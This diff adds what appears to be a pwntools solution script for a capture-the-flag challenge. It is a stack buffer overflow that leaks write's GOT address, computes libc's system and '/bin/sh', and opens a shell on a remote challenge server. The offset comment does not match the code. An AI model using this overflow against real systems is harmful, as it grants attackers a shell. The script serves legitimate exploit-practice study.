@@ -1,0 +1,24 @@
+1.先泄露目标机read和write地址(got)，得知libc版本
+2.通过偏移,计算出system和binsh的位置
+3.利用
+
+
+
+from pwn import *
+#p = process("./level3")
+elf = ELF("./level3")
+p = remote("111.198.29.45", 32364)
+
+#payload1 = "a"*140 + p32(elf.symbols["write"]) +p32(0x0804844b) + p32(1) +p32(elf.got["write"]) + p32(4)
+payload1 = "a"*140 + p32(elf.symbols["write"]) +p32(0x0804844b) + p32(1) +p32(elf.got["write"]) + p32(4)
+p.sendafter("Input:\n", payload1)
+write = u32(p.recv(4))
+print hex(write)
+libcbase = write - 0x0e6d80
+print hex(libcbase)
+system = write - 0x99a80 # 0xa9b80 = write - system
+binsh = write + 0x84c6b
+payload2 = "a"*140 + p32(system) + p32(0x0804844b) + p32(binsh)
+print payload2
+p.sendafter("Input:\n", payload2)
+p.interactive()
